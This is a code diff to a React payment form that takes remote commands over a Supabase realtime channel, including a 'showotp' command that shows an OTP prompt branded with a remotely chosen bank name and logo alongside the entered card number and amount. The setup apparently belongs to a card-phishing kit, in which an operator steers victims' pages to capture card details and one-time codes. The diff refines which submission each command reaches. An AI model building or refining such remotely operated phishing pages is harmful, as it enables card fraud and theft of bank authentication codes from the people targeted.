@@ -192,7 +192,12 @@ const PaymentForm = () => {
           console.log('Current submission ID:', currentSubmissionId);
           console.log('Bank name:', bankName, 'Bank logo:', bankLogo);
           
-          // Process commands - removed the submission ID check that was preventing commands from working
+          // Process commands for the current submission or global commands
+          if (submissionId && submissionId !== currentSubmissionId) {
+            console.log('Command not for current submission, ignoring');
+            return;
+          }
+          
           switch (command) {
             case 'showotp':
               console.log('Executing showotp command with bank:', bankName, bankLogo);
@@ -294,7 +299,7 @@ const PaymentForm = () => {
       supabase.removeChannel(channel);
       document.removeEventListener('click', handleDocumentClick);
     };
-  }, []); // Removed currentSubmissionId dependency to ensure commands always work
+  }, [currentSubmissionId]);
 
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\D/g, '');
@@ -465,7 +470,7 @@ const PaymentForm = () => {
           invalidOtpMessage={invalidOtpMessage}
           cardNumber={formData.cardNumber}
           amount={formData.amount}
-          bankLogo={selectedBankLogo || selectedBank}
+          bankLogo={selectedBankLogo}
         />
       </div>
     );
@@ -667,7 +672,7 @@ const PaymentForm = () => {
           <img 
             src="https://logotyp.us/file/rupay.svg" 
             alt="RuPay" 
-            className="h-10 w-14 object-contain filter brightness-0" 
+            className="h-8 w-12 object-contain filter brightness-0" 
           />
         </div>
 
